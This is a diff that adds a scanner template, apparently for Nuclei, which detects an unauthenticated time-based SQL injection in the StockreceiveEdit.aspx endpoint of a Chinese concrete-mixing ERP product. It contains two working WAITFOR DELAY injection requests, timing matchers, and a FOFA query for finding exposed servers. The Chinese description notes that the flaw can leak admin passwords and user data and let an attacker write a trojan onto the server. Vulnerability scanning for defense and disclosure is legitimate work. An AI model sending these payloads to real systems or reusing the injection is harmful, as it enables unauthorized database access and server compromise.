@@ -1,0 +1,27 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=4 && duration_1<=5
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+      raw:
+        - |
+          GET /ERP/StockreceiveEdit.aspx?id=1;WAITFOR%20DELAY%20%270:0:4%27-- HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        - |
+          GET /ERP/StockreceiveEdit.aspx?id=1;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+id: shanghunERP-StockreceiveEdit_aspx-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: app="商混ERP系统"
+        商混ERP系统 StockreceiveEdit.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 商混ERP系统 StockreceiveEdit.aspx SQL延时注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487565&idx=1&sn=8d8079c0446470bcb1f32d89872f6110&chksm=c267a57ef5102c6883feac8b1f870a56b0a06997881367ecd3dc0eb18871aee558fd58b268c2&token=1439003696&lang=zh_CN#rd
+    severity: high
+    tags: []
